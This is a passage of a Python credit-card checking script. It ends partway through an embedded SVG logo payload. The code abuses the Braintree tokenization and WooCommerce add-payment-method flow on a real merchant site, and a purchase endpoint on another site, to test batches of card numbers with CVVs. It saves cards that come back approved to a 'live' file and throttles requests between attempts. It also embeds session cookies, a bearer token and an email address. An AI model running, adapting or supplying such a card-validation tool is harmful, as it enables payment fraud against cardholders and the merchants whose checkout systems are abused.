        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

	data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': ey,
    }

	response = r.post('https://www.yazoomills.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data).json()

	res = response["data"]

	decode = base64.b64decode(res).decode('utf-8')
	firs = json.loads(decode).get('authorizationFingerprint')
	auth = firs if firs else None


	headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.9',
        'authorization': f'Bearer {auth}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

	json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '92297029-799a-4bde-8741-73f9159fbd5a',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	
	tok = response.json()["data"]["tokenizeCreditCard"]["token"]
	type = response.json()["data"]["tokenizeCreditCard"]["creditCard"]["brandCode"]



	cookies = {
    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': 'zjdkdidhsjndj%7C1722392839%7C444jS0mi0EaT13V8TdsFM97iMIRz1wkjpRMbTkZOQoa%7Cfd75c26b036d310328e93d0d455027b46682a740d4c4853f63562e810a8b14be',
    }

	headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'priority': 'u=0, i',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

	data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': type,
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': tok,
        'wc_braintree_device_data': '{"correlation_id":"'+corr+'"}',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': nonce_add,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

	response = r.post('https://www.yazoomills.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)

	text = response.text

	pattern = r'<li>\s*(.*?)</li>\s*</ul>'

	msg = re.search(pattern, text)

	if msg:
		results = msg.group(1).strip()
	else:
		if 'Nice! New payment method added:' in text:
			results = "1000: Approved"
		elif 'risk_threshold' in text:
			results = "RISK: Retry this BIN later."
		else:
			results = "Error"

	if 'avs' in results or '1000: Approved' in results or 'Duplicate' in results or 'Insufficient Funds' in results or 'Card Issuer Declined CVV' in results:
		live = f'[{start_num}] {P} >> {results} ✅'
		live2 = f'{P}'
		print(live) 
		with open('live.txt', 'a', encoding='utf-8') as file:
			file.write(live2 + '\n')
	else:
		print(f'[{start_num}] {P} >> {results} ❌')

	time.sleep(20)
	
	
	
from user_agent import generate_user_agent
def brch(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm= ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	user = generate_user_agent()
	
	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjEwNDc5ODYsImp0aSI6IjVjYTUyNzVkLTM1M2MtNGExZS1hZWE4LWRlNjk4MzZiMjc3NyIsInN1YiI6ImZ6anc5bXIyd2RieXJ3YmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZ6anc5bXIyd2RieXJ3YmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.OhSLESvIfCFG4sL2eQ5l5F5QwzjnmiZ9D47xLh670lLPyHt1pEdEZnwQBUd6Ac8Z7Dg2Qittg4DT1EI0Av8LWg',
	    'braintree-version': '2018-05-10',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'pragma': 'no-cache',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'dropin2',
	        'sessionId': '61cfaef9-c35f-4bbf-866a-61ee5a9d8bd9',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = (response.json()['data']['tokenizeCreditCard']['token'])
	
	
	import requests
	
	cookies = {
	    '_ga': 'GA1.2.1606805007.1718596005',
	    '_gid': 'GA1.2.1984151369.1720961421',
	    '_gat': '1',
	    '_ga_93VBC82KGM': 'GS1.2.1720961422.3.1.1720961530.0.0.0',
	}
	
	headers = {
	    'authority': 'app.brandmark.io',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json;charset=UTF-8',
	    # 'cookie': '_ga=GA1.2.1606805007.1718596005; _gid=GA1.2.1984151369.1720961421; _gat=1; _ga_93VBC82KGM=GS1.2.1720961422.3.1.1720961530.0.0.0',
	    'origin': 'https://app.brandmark.io',
	    'pragma': 'no-cache',
	    'referer': 'https://app.brandmark.io/v3/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	}
	
	json_data = {
	    'tier': 'basic',
	    'email': 'amnbwwww@gmail.com',
	    'payload': {
	        'nonce': 'tokencc_bh_5jtnzd_m3rk58_k9q7xy_k9dzww_32z',
	        'details': {
	            'expirationMonth': '03',
	            'expirationYear': '2026',
	            'bin': '517008',
	            'cardType': 'MasterCard',
	            'lastFour': '9189',
	            'lastTwo': '89',
	        },
	        'type': 'CreditCard',
	        'description': 'ending in 89',
	        'deviceData': '{"device_session_id":"e4dc228052c5495b85317d7800876bf7","fraud_merchant_id":null,"correlation_id":"0148380e790112fac7e34008048e404a"}',
	        'binData': {
	            'prepaid': 'No',
	            'healthcare': 'No',
	            'debit': 'Yes',
	            'durbinRegulated': 'No',
	            'commercial': 'Unknown',
	            'payroll': 'No',
	            'issuingBank': 'BOKIS A/S',
	            'countryOfIssuance': 'DNK',
	            'productId': 'MDS',
	        },
	    },
	    'discount': False,
	    'referral': None,
	    'params': {
	        'id': 'logo-36903fc4-3622-4a30-9bde-b4d05a190409',
	        'layout': 0,
	        'title': '.............',
	        'titleFamily': 'Brandmark Sans 23 Spectrum',
	        'titleVariant': 'regular',
	        'titleColor': [
	            {
	                'hex': '#0050ff',
	                'location': 0,
	            },
	            {
	                'hex': '#2850a7',
	                'location': 0.5,
	            },
	            {
	                'hex': '#515050',
	                'location': 1,
	            },
	        ],
	        'titleScale': 0.69,
	        'titleLetterSpace': 0,
	        'titleLineSpace': 1.1,
	        'titleBoldness': 0,
	        'titleX': 0,
	        'titleY': 0,
	        'titleAlign': 'center',
	        'slogan': '',
	        'sloganFamily': 'Raleway',
	        'sloganVariant': '300italic',
	        'sloganColor': [
	            {
	                'hex': '#0050ff',
	            },
	        ],
	        'sloganScale': 0.77,
	        'sloganLetterSpace': 10,
	        'sloganLineSpace': 1.1,
	        'sloganBoldness': 0,
	        'sloganAlign': 'center',
	        'sloganX': 0,
	        'sloganY': 0,
	        'icon': None,
	        'showIcon': False,
	        'iconScale': 1,
	        'iconColor': [
	            {
	                'hex': '#0050ff',
	            },
	        ],
	        'iconContainer': None,
	        'showIconContainer': False,
	        'iconContainerScale': 1,
	        'iconContainerColor': [
	            {
	                'hex': '#272727',
	            },
	        ],
	        'iconSpace': 1,
	        'iconX': 0,
	        'iconY': 0,
	        'nthChar': 0,
	        'container': None,
	        'showContainer': False,
	        'containerScale': 1,
	        'containerColor': [
	            {
	                'hex': '#272727',
	            },
	        ],
	        'containerX': 0,
	        'containerY': 0,
	        'backgroundColor': [
	            {
	                'hex': '#131313',
	            },
	        ],
	        'palette': [
	            '#131313',
	            '#0050ff',
	            '#1b50c4',
	            '#36508a',
	            '#515050',
	        ],
	        'keywords': [
	            '..........',
	            'm',
	        ],
	    },
	    'svg': '<!--?xml version="1.0" encoding="UTF-8" standalone="no"?-->\n<svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="svg179433" viewBox="0 0 1024 768" height="768px" width="1024px" version="1.1">\n  <metadata id="metadata179439">\n    <rdf:rdf>\n      <cc:work rdf:about="">\n        <dc:format>image/svg+xml</dc:format>\n        <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage"></dc:type>\n      </cc:work>\n    </rdf:rdf>\n  </metadata>\n  <defs id="defs179437"></defs>\n  <linearGradient spreadMethod="pad" y2="30%" x2="-10%" y1="120%" x1="30%" id="3d_gradient2-logo-36903fc4-3622-4a30-9bde-b4d05a190409">\n    <stop id="stop179414" stop-opacity="1" stop-color="#ffffff" offset="0%"></stop>\n    <stop id="stop179416" stop-opacity="1" stop-color="#000000" offset="100%"></stop>\n  </linearGradient>\n  <linearGradient gradientTransform="rotate(-30)" spreadMethod="pad" y2="30%" x2="-10%" y1="120%" x1="30%" id="3d_gradient3-logo-36903fc4-3622-4a30-9bde-b4d05a190409">\n    <stop id="stop179419" stop-opacity="1" stop-color="#ffffff" offset="0%"></stop>\n    <stop id="stop179421" stop-opacity="1" stop-color="#cccccc" offset="50%"></stop>\n    <stop id="stop179423" stop-opacity="1" stop-color="#000000" offset="100%"></stop>\n  </linearGradient>\n  <g id="logo-group">\n    <image xlink:href="" id="container" x="272" y="144" width="480" height="480" style="display: none;" transform="translate(0 0)"></image>\n    <g id="logo-center" transform="translate(2.2737367544323206e-13 0)">\n      <image xlink:href="" id="icon_container" x="0" y="0" style="display: none;"></image>\n      <g id="slogan" style="font-style:oblique;font-weight:300;font-size:32px;line-height:1;font-family:Raleway;font-variant-ligatures:none;text-align:center;text-anchor:middle" transform="translate(0 0)"></g>\n      <g id="title" style="font-style:normal;font-weight:normal;font-size:72px;line-height:1;font-family:\'Brandmark Sans 23 Spectrum\';font-variant-ligatures:normal;text-align:center;text-anchor:middle" transform="translate(0 0)">\n        <g id="path179442" aria-label="." transform="translate(0 318.29571999999996) translate(373.20812909000006 57.43256) scale(0.69) translate(-310.83436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(222.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(222.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(222.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n        <g id="path179444" aria-label="." transform="translate(0 318.29571999999996) translate(394.94312909000007 57.43256) scale(0.69) translate(-342.33436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(254.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(254.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(254.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n        <g id="path179446" aria-label="." transform="translate(0 318.29571999999996) translate(416.6781290900001 57.43256) scale(0.69) translate(-373.83436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(285.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(285.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(285.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n        <g id="path179448" aria-label="." transform="translate(0 318.29571999999996) translate(438.4131290900001 57.43256) scale(0.69) translate(-405.33436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(317.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(317.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(317.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n        <g id="path179450" aria-label="." transform="translate(0 318.29571999999996) translate(460.1481290900001 57.43256) scale(0.69) translate(-436.83436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(348.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(348.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(348.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n        <g id="path179452" aria-label="." transform="translate(0 318.29571999999996) translate(481.8831290900001 57.43256) scale(0.69) translate(-468.33436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(380.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(380.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(380.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n        <g id="path179454" aria-label="." transform="translate(0 318.29571999999996) translate(503.61812909000014 57.43256) scale(0.69) translate(-499.83436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(411.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(411.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(411.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n        <g id="path179456" aria-label="." transform="translate(0 318.29571999999996) translate(525.35312909 57.43256) scale(0.69) translate(-531.33436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(443.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(443.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(443.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n        <g id="path179458" aria-label="." transform="translate(0 318.29571999999996) translate(547.0881290899999 57.43256) scale(0.69) translate(-562.83436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(474.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(474.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(474.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n        <g id="path179460" aria-label="." transform="translate(0 318.29571999999996) translate(568.8231290899998 57.43256) scale(0.69) translate(-594.33436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(506.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(506.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(506.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n        <g id="path179462" aria-label="." transform="translate(0 318.29571999999996) translate(590.5581290899997 57.43256) scale(0.69) 